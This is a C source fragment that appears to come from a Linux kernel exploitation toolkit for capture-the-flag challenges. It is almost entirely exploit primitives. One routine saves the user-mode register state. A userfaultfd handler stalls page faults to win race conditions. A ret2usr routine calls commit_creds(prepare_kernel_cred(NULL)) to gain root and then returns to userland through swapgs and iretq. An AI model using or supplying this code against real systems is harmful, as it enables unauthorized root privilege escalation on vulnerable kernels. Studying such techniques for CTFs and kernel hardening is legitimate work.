size_t user_cs=0, user_ss=0, user_rflags=0, user_sp=0;
__attribute__((naked)) void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

/*
Userfaultfd for race condition,
Usage:
    size_t *ptr = forze();
*/
void* userfaultfd_leak_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    
    nready = poll(&pollfd, 1, -1);
    sleep(100000);
    if (nready != 1)
    {
        panic("Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        panic("msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        panic("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}
void  RegisterUserfault(void *fault_page)
{
    void *handler = userfaultfd_leak_handler;
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        panic("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; 
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
        panic("ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL,handler, (void*)uffd);

    if (s!=0)
        panic("pthread_create");
}
size_t * froze(){
    size_t *ptr=mmap(0xdeadbeef000,0x1000,5,0x21,0,0);
    if (ptr!=0xdeadbeef000)
        panic("[x] Froze zone");
    RegisterUserfault(ptr);
    return ptr;
}

//  Part III: ret2usr
//  Died on Recent Kernels


/*
    Name: getRootPrivilige
    Desc:
        getRootPrivilige for ret2usr.
        Before hitting this chal, 
        set commit_creds, prepare_kernel_cred, back2user

    Example:
        getRootPrivilige(msgid);
*/
void back2userImp()
{
    __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;");
}
size_t commit_creds = NULL;
size_t prepare_kernel_cred = NULL;
void (*back2user)()=NULL;

void getRootPrivilige()
{
    if(prepare_kernel_cred==NULL || commit_creds == NULL)
        panic("[-] prepare_kernel_cred or commit_creds is not set.");
    
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
    if(back2user==NULL)
        panic("[-] back2user is not set.");
    info("[n132] Here we go!");
    back2user();
}